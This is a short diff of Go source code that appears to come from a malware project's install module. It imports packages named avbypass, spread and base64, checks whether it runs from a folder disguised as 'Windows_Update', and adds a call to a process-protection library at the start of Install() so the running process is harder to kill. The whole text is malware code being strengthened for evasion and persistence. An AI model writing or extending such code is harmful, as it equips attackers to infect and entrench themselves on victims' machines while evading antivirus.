@@ -2,15 +2,21 @@ package install
 
 import (
 	"os"
-	"../utils"
-	cp "github.com/cleversoap/go-cp"
+
 	"../avbypass"
 	"../base64"
 	"../spread"
+	"../utils"
+	cp "github.com/cleversoap/go-cp"
+
+	"github.com/SaturnsVoid/Process-Protection/process_protection"
 )
 
 var TARGET_FILE_NAME = utils.TARGET_FILE_NAME
+
 func Install() {
+	process_protection.Protect()
+
 	// Checks if not running in home folder
 	parent := spread.GetParentFolder()
 	if parent != "Windows_Update" && spread.GetExeName() != TARGET_FILE_NAME {
